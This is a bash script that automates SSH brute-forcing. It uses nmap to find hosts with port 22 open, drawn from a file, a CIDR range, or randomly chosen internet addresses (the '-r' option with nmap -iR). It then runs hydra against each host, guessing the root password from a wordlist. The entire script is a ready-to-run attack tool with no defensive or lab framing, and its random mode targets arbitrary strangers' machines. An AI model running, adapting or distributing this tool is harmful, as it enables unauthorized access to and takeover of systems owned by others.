#!/bin/bash

if [ $# -lt 4 ] 
then
   echo "usage: ./hydra.sh -p ./password.txt -f ./iplist.txt"
   echo "usage: ./hydra.sh -p ./password.txt -l 192.168.9.0/24"
   echo "usage: ./hydra.sh -p ./password.txt -r 10000"
   exit 1
fi

while [ -n "$1" ]  
do  
  case "$1" in    
    -p)  
        passfile=$2
        #echo $passfile 
        shift  
        ;;  
    -f)  
        nmap -vv -n -sS -sU -p22 -iL $2  | grep "Discovered open port" | awk {'print $6'} | awk -F/ {'print $1'} > ./22-output.txt
        shift  
        ;;  
    -l)  
        nmap -vv -n -sS -sU -p22 $2  | grep "Discovered open port" | awk {'print $6'} | awk -F/ {'print $1'} > ./22-output.txt 
        shift  
        ;; 
    -r)
	nmap -vv -n -sS -sU -p22 -iR $2  | grep "Discovered open port" | awk {'print $6'} | awk -F/ {'print $1'} > ./22-output.txt
	shift
	;;
    *)  
        echo "$1 is not an option"  
        echo "usage: ./hydra.sh -p ./password.txt -f ./iplist.txt"
        echo "usage: ./hydra.sh -p ./password.txt -l 192.168.9.0/24"
        exit 1
        ;;  
  esac  
  shift  
done

echo "-----------port scan finished-----------"

chmod 666 ./22-output.txt

#echo `cat ./22-output.txt` 

cat ./22-output.txt | while read line
do 
    echo "Current Task: ${line}"
    hydra -l root -P $passfile -t 6 -vV $line ssh | grep "host:"
done

echo "-------password guessing finished-------"

